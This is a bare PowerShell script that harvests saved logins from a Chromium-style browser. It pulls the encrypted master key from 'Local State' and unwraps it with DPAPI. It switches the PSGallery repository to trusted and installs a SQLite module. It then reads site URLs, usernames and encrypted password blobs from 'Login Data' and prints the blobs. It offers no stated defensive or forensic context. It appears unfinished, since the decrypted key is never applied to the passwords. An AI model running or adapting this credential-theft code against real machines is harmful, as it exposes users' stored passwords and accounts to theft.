Add-Type -AssemblyName System.Security
Add-Type -AssemblyName System.Text.Encoding
$LocalState = Get-Content -Raw -Path 'Local State' | ConvertFrom-Json
$EncodedKey = [System.Convert]::FromBase64String($LocalState.os_crypt.encrypted_key)
$EncodedKeyCorrectSize = $EncodedKey[5..($EncodedKey.length-1)]
$DecodedKey =  [System.Convert]::ToBase64String([Security.Cryptography.ProtectedData]::Unprotect($EncodedKeyCorrectSize, $null, [Security.Cryptography.DataProtectionScope]::LocalMachine))
Set-PSRepository -name 'PSGallery' -InstallationPolicy Trusted
Install-Module -Scope CurrentUser PSSQLite
Import-Module PSSQLite
$Database = '.\Login Data'
$Query = 'SELECT origin_url, username_value, password_value FROM logins'
$data = Invoke-SqliteQuery -DataSource $Database -Query $Query
for ($i = 0; $i -lt $data.Count; $i++) {
$EncryptedBytes =  $data[$i].password_value
$EncryptedBytesCorrectSize = $EncryptedBytes[3..($EncryptedBytes.length - 1)]
$EncryptedString = [System.Convert]::ToBase64String($EncryptedBytesCorrectSize)
Write-Output($EncryptedString)}
